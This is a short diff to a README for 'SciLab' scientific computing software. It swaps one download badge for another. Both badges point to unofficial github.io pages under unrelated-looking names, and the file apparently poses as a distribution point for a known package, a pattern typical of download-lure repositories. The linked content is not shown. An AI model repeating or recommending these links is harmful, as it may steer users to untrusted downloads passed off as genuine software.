@@ -1,10 +1,6 @@
 # SciLab – Free Scientific Computing & Numerical Analysis Software
 
-## 📥 SciLab
-
-[![⬇️ SciLab](https://img.shields.io/badge/Download-SciLab-blue?style=for-the-badge&logo=scilab)](https://tobiasknightpwqo.github.io/.github/scilab-numerical-analysis)
-
----
+[![Launch SciLab](https://img.shields.io/badge/Launch-SciLab-7C3AED?style=flat-square)](https://scilab-scientific-computing.github.io/.github/)
 
 ## 📦 How to Install
 
